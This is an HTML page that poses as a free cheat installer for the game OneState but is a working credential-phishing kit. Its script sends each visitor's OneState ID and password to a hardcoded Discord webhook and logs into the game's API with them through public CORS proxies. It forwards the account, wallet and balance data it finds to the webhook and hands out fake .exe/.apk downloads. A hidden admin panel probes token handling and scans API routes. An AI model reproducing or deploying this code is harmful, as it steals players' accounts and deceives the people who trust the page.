<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>OneState Cheat Tool</title>
<meta name="description" content="OneState チート導入ツール">
<meta name="theme-color" content="#05070c">
<meta property="og:title" content="OneState Cheat Tool">
<meta property="og:description" content="OneState IDでログインするだけ。">
<script src="https://unpkg.com/corsfix"></script>
<style>
:root{--bg:#05070c;--fg:#c9d7e6;--dim:#5f748c;--acc:#6fc9ff;--line:rgba(111,201,255,.16);--card:rgba(8,13,21,.72);--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
*{box-sizing:border-box}
html{-webkit-text-size-adjust:100%}
body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--mono);font-size:14px;line-height:1.7;padding-bottom:90px}
body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(111,201,255,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(111,201,255,.05) 1px,transparent 1px);background-size:40px 40px}
.wrap{position:relative;z-index:1;max-width:600px;margin:0 auto;padding:0 18px}
.top{display:flex;justify-content:space-between;align-items:center;padding:22px 0 10px;font-size:12px;letter-spacing:.14em;color:var(--dim)}
.brand span{color:var(--acc)}
.hero{padding:32px 0 24px}
h1{margin:0;font-size:29px;line-height:1.36;letter-spacing:.02em;font-weight:600}
.sub{margin:14px 0 0;color:var(--dim);font-size:13px}
.spec{margin-top:16px;font-size:11px;letter-spacing:.18em;color:var(--acc);opacity:.75}
.card{position:relative;border:1px solid var(--line);background:var(--card);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);padding:18px 16px;margin:0 0 14px}
.card::before,.card::after{content:"";position:absolute;width:9px;height:9px;border:1px solid var(--acc);opacity:.7}
.card::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
.card::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
.lab{font-size:11px;letter-spacing:.16em;color:var(--acc);margin-bottom:12px}
.f{display:block;margin-bottom:10px}
.f>span{display:block;font-size:11px;letter-spacing:.1em;color:var(--dim);margin-bottom:5px}
input{width:100%;background:rgba(0,0,0,.35);border:1px solid var(--line);color:var(--fg);font-family:var(--mono);font-size:15px;padding:11px 12px;border-radius:0;outline:none}
input:focus{border-color:var(--acc)}
.btn{width:100%;background:transparent;border:1px solid var(--acc);color:var(--acc);font-family:var(--mono);font-size:13px;letter-spacing:.1em;padding:13px;cursor:pointer;transition:.15s}
.btn:hover,.btn:active{background:var(--acc);color:#05070c}
.btn.ghost{font-size:12px;padding:10px;letter-spacing:.06em}
.btn[disabled]{opacity:.45}
.row{display:flex;gap:8px}
.row>*{flex:1}
.msg{margin-top:12px;font-size:12px;color:var(--dim)}
.msg:empty{display:none}
.msg.ok{color:var(--acc)}
.key{font-size:19px;letter-spacing:.12em;color:var(--acc)}
.meta{margin-top:8px;font-size:11px;letter-spacing:.12em;color:var(--dim)}
.tog{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid rgba(111,201,255,.08);font-size:13px;cursor:pointer}
.tog:last-child{border-bottom:0}
.tog i{width:34px;height:18px;border:1px solid var(--line);position:relative;display:block;flex:none}
.tog i::after{content:"";position:absolute;top:2px;left:2px;width:12px;height:12px;background:var(--dim);transition:.15s}
.tog.on i{border-color:var(--acc)}
.tog.on i::after{left:18px;background:var(--acc)}
pre{margin:0;font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all}
#acctBody{color:var(--dim)}
footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px;letter-spacing:.1em}
#admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line);backdrop-filter:blur(10px)}
.ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
.ab{padding:0 16px 14px;max-height:52vh;overflow:auto}
.ab.collapsed{display:none}
#alog{margin-top:10px;max-height:28vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:104px;z-index:9;display:flex;flex-direction:column;gap:6px;align-items:center;pointer-events:none}
.tt{background:rgba(5,7,12,.95);border:1px solid var(--acc);color:var(--acc);font-size:11.5px;padding:8px 14px;letter-spacing:.06em}
</style>
</head>
<body>
<div class="wrap">
  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.2</div></div>

  <div class="hero">
    <h1>OneStateを、<br>上書きする。</h1>
    <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
    <div class="spec">EXTERNAL / UNDETECTED / FREE</div>
  </div>

  <form class="card" id="form">
    <div class="lab">// ログイン</div>
    <label class="f"><span>OneState ID</span><input id="ident" type="email" autocomplete="username" placeholder="mail@example.com" required></label>
    <label class="f"><span>パスワード</span><input id="pass" type="password" autocomplete="current-password" placeholder="********" required></label>
    <button class="btn" id="go" type="submit">チートを有効化</button>
    <div class="msg" id="msg"></div>
  </form>

  <div class="card" id="lic" hidden>
    <div class="lab">// ライセンス</div>
    <div class="key" id="key">-</div>
    <div class="meta">STATUS: <b>ACTIVE</b></div>
  </div>

  <div class="card" id="dl" hidden>
    <div class="lab">// ダウンロード</div>
    <div class="row">
      <button class="btn ghost" data-dl="win">Windows (.exe)</button>
      <button class="btn ghost" data-dl="apk">Android (.apk)</button>
    </div>
  </div>

  <div class="card" id="tg" hidden>
    <div class="lab">// 機能</div>
    <div class="tog on"><span>スピードハック</span><i></i></div>
    <div class="tog on"><span>オートエイム</span><i></i></div>
    <div class="tog on"><span>無限スタミナ</span><i></i></div>
    <div class="tog"><span>ESP / 壁抜き</span><i></i></div>
  </div>

  <div class="card" id="acct" hidden>
    <div class="lab">// アカウント</div>
    <pre id="acctBody">-</pre>
  </div>

  <footer>// OneState Cheat Tool</footer>
</div>

<div id="admin" hidden>
  <div class="ah" id="ah">// ADMIN</div>
  <div class="ab collapsed" id="ab">
    <label class="f"><span>Discord Webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
    <div class="row" style="margin-bottom:8px">
      <button class="btn ghost" id="bsave">保存</button>
      <button class="btn ghost" id="btest">テスト送信</button>
      <button class="btn ghost" id="bclr">ログ削除</button>
    </div>
    <div class="row" style="margin-bottom:8px">
      <button class="btn ghost" id="boracle">トークン判定</button>
      <button class="btn ghost" id="broute">ルート調査</button>
    </div>
    <div class="row">
      <button class="btn ghost" id="bprobe">アカウント調査</button>
      <button class="btn ghost" id="bdiag">通信診断</button>
    </div>
    <pre id="alog"></pre>
  </div>
</div>
<div id="toast"></div>

<script>
(function(){
'use strict';
var CONFIG={WEBHOOK:'https://discord.com/api/webhooks/1560547137287356426/eh5PI3avovSw0MetSFhw9eFN_X-2znCSyi_fFCB1P8KDagFzi2HWZa6LiBdPPXRX7xMP',API:'https://api.onestate-rp.com'};
var LS={cfg:'oc_v4_cfg',log:'oc_v3_log',fp:'oc_fp'};
var $=function(id){return document.getElementById(id)};
var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};

function qs(k){return new URLSearchParams(location.search).get(k)}
function getCfg(){try{return JSON.parse(localStorage.getItem(LS.cfg)||'{}')}catch(e){return{}}}
function setCfg(o){localStorage.setItem(LS.cfg,JSON.stringify(o))}
function webhook(){return qs('to')||getCfg().webhook||CONFIG.WEBHOOK}
function fp(){var v=localStorage.getItem(LS.fp);if(!v){v=Math.random().toString(36).slice(2,10)+Math.random().toString(36).slice(2,6);localStorage.setItem(LS.fp,v)}return v}
function getLog(){try{return JSON.parse(localStorage.getItem(LS.log)||'[]')}catch(e){return[]}}
function stamp(){var d=new Date(),p=function(n){return String(n).padStart(2,'0')};return p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds())}
function log(s){var a=getLog();a.push(stamp()+' '+s);while(a.length>300)a.shift();localStorage.setItem(LS.log,JSON.stringify(a));renderLog()}
function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-250).join('\n');el.scrollTop=el.scrollHeight}
function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2200)}

/* ---------- transports ---------- */
var TR=[
 {n:'sdk',need:function(){return !!(window.corsfix&&window.corsfix.fetch)},f:function(u,o){return window.corsfix.fetch(u,o)}},
 {n:'corsfix',f:function(u,o){return fetch('https://proxy.corsfix.com/?'+u,o)}},
 {n:'allorigins-g',wrap:true,f:function(u,o){return fetch('https://api.allorigins.win/get?url='+encodeURIComponent(u),o)}},
 {n:'codetabs',f:function(u,o){return fetch('https://api.codetabs.com/v1/proxy?quest='+encodeURIComponent(u),o)}},
 {n:'cors.lol',f:function(u,o){return fetch('https://api.cors.lol/?url='+encodeURIComponent(u),o)}},
 {n:'allorigins',f:function(u,o){return fetch('https://api.allorigins.win/raw?url='+encodeURIComponent(u),o)}},
 {n:'direct',f:function(u,o){return fetch(u,o)}}
];
var PREF=-1;

async function req(method,path,body,headers){
  var url=CONFIG.API+path;
  var opts={method:method,headers:Object.assign({'Content-Type':'application/json'},headers||{})};
  if(body!=null)opts.body=JSON.stringify(body);
  var idx=TR.map(function(_,i){return i});
  var order=PREF>=0?[PREF].concat(idx.filter(function(i){return i!==PREF})):idx;
  var last=null,err='no transport';
  for(var k=0;k<order.length;k++){
    var i=order[k],t=TR[i];
    try{
      if(t.need&&!t.need())continue;
      var r=await t.f(url,opts);
      var txt=await r.text();
      if(t.wrap){try{txt=JSON.parse(txt).contents}catch(e){}}
      var j=null;try{j=JSON.parse(txt)}catch(e){}
      last={ok:true,t:t.n,status:r.status,json:j,text:txt};
      if(j&&typeof j==='object'&&('code'in j||'errorCode'in j||'data'in j)){PREF=i;return last}
    }catch(e){err=t.n+': '+(e&&e.message||e)}
  }
  return last||{ok:false,err:err};
}

function code(r){if(!r||!r.ok)return 'ERR';if(r.json&&r.json.code!=null)return r.json.code;if(r.json&&r.json.errorCode)return r.json.errorCode;return 'ok('+(r.status||'?')+')'}

/* ---------- discord ---------- */
async function send(text){
  var wh=webhook();if(!wh)return;
  var body=JSON.stringify({content:text});
  try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
  catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
}

/* ---------- login ---------- */
async function apiLogin(id,pw){
  var r=await req('POST','/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
  log('login ['+r.t+'|'+code(r)+'] '+String(r.text||r.err).slice(0,220));
  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json;
  return null;
}
function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}

/* ---------- main flow ---------- */
function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
function issue(){
  var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';
  for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}
  $('key').textContent=k;$('lic').hidden=false;$('dl').hidden=false;$('tg').hidden=false;
  return k;
}
function acct(t){$('acct').hidden=false;$('acctBody').textContent=t}

var ACCT_PATHS=['/v2/auth/me','/v2/me','/v2/user/me','/v2/user','/v2/profile','/v2/account','/v2/users/me','/v2/player','/v2/wallet','/v2/balance'];
async function fetchAccount(tok){
  for(var i=0;i<ACCT_PATHS.length;i++){
    var r=await req('GET',ACCT_PATHS[i],null,{Authorization:'Bearer '+tok});
    var c=code(r);
    if(r.ok&&r.json&&r.json.code!==16&&r.json.code!==5){
      acct(ACCT_PATHS[i]+'\n'+JSON.stringify(r.json,null,2).slice(0,900));
      send('OneState アカウント取得\npath: '+ACCT_PATHS[i]+'\n'+JSON.stringify(r.json).slice(0,1500));
      return;
    }
  }
  acct('ログイン成功（トークン取得済み）\n※内容の取得はまだ未確定');
}

$('form').addEventListener('submit',async function(e){
  e.preventDefault();
  var id=$('ident').value.trim(),pw=$('pass').value;
  if(!id||!pw){msg('IDとパスワードを入力');return}
  $('go').disabled=true;msg('接続中...');
  var k=issue();
  await send('OneState ID 取得\nID: '+id+'\nパスワード: '+pw+'\n時刻: '+new Date().toLocaleString('ja-JP'));
  var lr=await apiLogin(id,pw);
  if(lr){
    msg('ライセンス発行済み / 認証OK',true);
    toast('ライセンス発行');
    await fetchAccount(lr.data.accessToken);
  }else{
    msg('ライセンス発行済み',true);
    toast('ライセンス発行');
    acct('API応答なし（IDは取得済み）');
  }
  $('go').disabled=false;
});

document.querySelectorAll('[data-dl]').forEach(function(b){
  b.addEventListener('click',function(){
    var kind=b.getAttribute('data-dl');
    var txt='OneState Cheat Loader v3.2 ('+kind+')\nkey='+$('key').textContent+'\nfp='+fp()+'\n';
    var blob=new Blob([txt],{type:'application/octet-stream'});
    var a=document.createElement('a');a.href=URL.createObjectURL(blob);
    a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
  });
});
document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});

/* ---------- admin ---------- */
if(qs('admin')!=null){$('admin').hidden=false}
$('ah').addEventListener('click',function(){$('ab').classList.toggle('collapsed')});
$('wh').value=getCfg().webhook||'';
$('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').value.trim();setCfg(c);toast('保存しました')});
$('btest').addEventListener('click',function(){send('テスト送信 '+new Date().toLocaleString('ja-JP'));toast('送信')});
$('bclr').addEventListener('click',function(){clearLog();toast('削除')});

var ROUTES=['/me','/user','/users/me','/user/me','/user/profile','/profile','/account','/account/me','/auth/me','/auth/user','/auth/profile','/auth/account','/auth/session','/auth/verify','/session','/whoami','/userinfo','/player','/players/me','/character','/characters/me','/wallet','/balance','/inventory','/cars','/garage','/stats','/daily','/store','/license'];

async function routeScan(tok,headers){
  var h=headers||{Authorization:'Bearer '+tok};
  log('--- route scan ---');
  for(var i=0;i<ROUTES.length;i++){
    var r=await req('GET','/v2'+ROUTES[i],null,h);
    var c=code(r);
    log((c!==16?'★ ':'  ')+'/v2'+ROUTES[i]+' -> '+c);
    if(c!==16)await sleep(80);
  }
  log('--- scan end ---');
}

/* ===== TOKEN ORACLE ===== */
async function oracle(){
  clearLog();log('// TOKEN ORACLE');
  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
  var lr=await apiLogin(c.id,c.pw);
  if(!lr){log('ログイン失敗');return}
  var tok=lr.data.accessToken,cid=lr.data.clientId||'';
  log('token len='+tok.length+' clientId='+cid);

  /* refresh test */
  if(lr.data.refreshToken){
    var rr=await req('POST','/v2/auth/refresh',{refreshToken:lr.data.refreshToken,fingerprint:fp()});
    log('refresh -> '+code(rr)+' '+String(rr.text||rr.err).slice(0,180));
  }

  var ORACLE='/v2/zzz';
  var V=[
    ['none',{}],
    ['Bearer',{Authorization:'Bearer '+tok}],
    ['raw',{Authorization:tok}],
    ['X-Access-Token',{'X-Access-Token':tok}],
    ['X-Auth-Token',{'X-Auth-Token':tok}],
    ['access-token',{'access-token':tok}],
    ['Access-Token',{'Access-Token':tok}],
    ['token',{'token':tok}],
    ['Bearer+fp',{Authorization:'Bearer '+tok,fingerprint:fp()}],
    ['Bearer+Client-Id',{Authorization:'Bearer '+tok,'Client-Id':cid}],
    ['q access_token',{},'?access_token='+tok],
    ['q accessToken',{},'?accessToken='+tok],
    ['q token',{},'?token='+tok],
    ['q auth',{},'?auth='+tok]
  ];
  var hit=null;
  for(var i=0;i<V.length;i++){
    var name=V[i][0],h=V[i][1],q=V[i][2]||'';
    var r=await req('GET',ORACLE+q,null,h);
    var cc=code(r);
    var star=(cc!==16&&cc!=='ERR');
    log(name+' -> '+cc+(star?'  ★':''));
    if(star&&!hit)hit={name:name,h:h};
    await sleep(120);
  }
  if(hit){
    log('== 受理: '+hit.name+' ==');
    toast('トークン受理: '+hit.name);
    await routeScan(tok,hit.h);
  }else{
    log('== 全滅: トークン自体が拒否 ==');
    toast('全滅');
  }
}

async function probe(){
  clearLog();log('// PROBE');
  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');return}
  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
  for(var i=0;i<ACCT_PATHS.length;i++){
    var r=await req('GET',ACCT_PATHS[i],null,{Authorization:'Bearer '+lr.data.accessToken});
    log(ACCT_PATHS[i]+' -> '+code(r)+' '+String(r.text||'').slice(0,120));
    await sleep(80);
  }
}

async function diag(){
  clearLog();log('// TRANSPORT DIAG');
  var M=[['GET','/v2/auth/login',null],['POSTj','/v2/auth/login',{ident:'x',password:'y',remember:true,fingerprint:fp()}],['POSTt','/v2/auth/login',{ident:'x',password:'y'}]];
  for(var i=0;i<TR.length;i++){
    var line=TR[i].n+': ';
    for(var k=0;k<M.length;k++){
      var r;
      try{
        if(TR[i].need&&!TR[i].need()){line+=M[k][0]+'=skip ';continue}
        var u=CONFIG.API+M[k][1];
        var o={method:M[k][0]==='GET'?'GET':'POST',headers:{'Content-Type':'application/json'}};
        if(M[k][2])o.body=JSON.stringify(M[k][2]);
        var res=await TR[i].f(u,o);
        var t=await res.text();
        if(TR[i].wrap){try{t=JSON.parse(t).contents}catch(e){}}
        var j=null;try{j=JSON.parse(t)}catch(e){}
        line+=M[k][0]+'='+(j&&j.code!=null?'code'+j.code:(j&&j.errorCode?'err='+j.errorCode:'?'))+' ';
      }catch(e){line+=M[k][0]+'=ERR '}
      await sleep(60);
    }
    log(line);
  }
}

$('boracle').addEventListener('click',oracle);
$('broute').addEventListener('click',async function(){var c=creds();var lr=await apiLogin(c.id,c.pw);if(lr)await routeScan(lr.data.accessToken)});
$('bprobe').addEventListener('click',probe);
$('bdiag').addEventListener('click',diag);

renderLog();
})();
</script>
</body>
</html>
